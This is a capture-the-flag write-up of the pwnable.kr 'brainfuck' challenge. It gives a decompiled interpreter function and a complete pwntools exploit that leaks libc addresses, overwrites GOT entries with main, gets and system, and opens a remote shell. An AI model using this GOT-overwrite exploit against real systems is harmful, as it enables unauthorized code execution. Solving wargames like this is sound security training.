Main function is ``do_brainfuck``

```cc
int __cdecl do_brainfuck(char a1)
{
  int result; // eax@1
  _BYTE *v2; // ebx@7

  result = a1;
  switch ( a1 )
  {
    case 62:                                    // '>'
      result = p++ + 1;
      break;
    case 60:                                    // '<'
      result = p-- - 1;
      break;
    case 43:                                    // '+'
      result = p;
      ++*(_BYTE *)p;
      break;
    case 45:                                    // '-'
      result = p;
      --*(_BYTE *)p;
      break;
    case 46:                                    // '.'
      result = putchar(*(_BYTE *)p);
      break;
    case 44:                                    // ','
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case 91:
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```

In this function, we can add or subtract the pointer p and other operations.
So we can calculate the position of the ``putchar`` / ``memset`` functions in the got table by the position of p and then overwrite it.

The final exploit is:

```python
from pwn import *

libc = ELF('bf_libc.so')
p = remote('pwnable.kr', 9001)


def back(n):
    return '<'*n


def read(n):
    return '.>'*n


def write(n):
    return ',>'*n

# get got table address

putchar_got = 0x0804A030
memset_got = 0x0804A02C
fgets_got = 0x0804A010
ptr = 0x0804A0A0

# leak putchar_addr
payload = back(ptr - putchar_got) + '.' + read(4)
# overwrite putchar_got to main_addr
payload += back(4) + write(4)
# overwrite memset_got to gets_addr
payload += back(putchar_got - memset_got + 4) + write(4)
# overwrite fgets_got to system_addr
payload += back(memset_got - fgets_got + 4) + write(4)
# JUMP to main
payload += '.'

p.recvuntil('[ ]\n')
p.sendline(payload)
p.recv(1)  # junkcode

putchar_libc = libc.symbols['putchar']
gets_libc = libc.symbols['gets']
system_libc = libc.symbols['system']

putchar = u32(p.recv(4))
log.success("putchar = " + hex(putchar))

gets = putchar - putchar_libc + gets_libc
log.success("gets = " + hex(gets))

system = putchar - putchar_libc + system_libc
log.success("system = " + hex(system))

main = 0x08048671
log.success("main = " + hex(system))

p.send(p32(main))
p.send(p32(gets))
p.send(p32(system))

p.sendline('//bin/sh\0')
p.interactive()
```
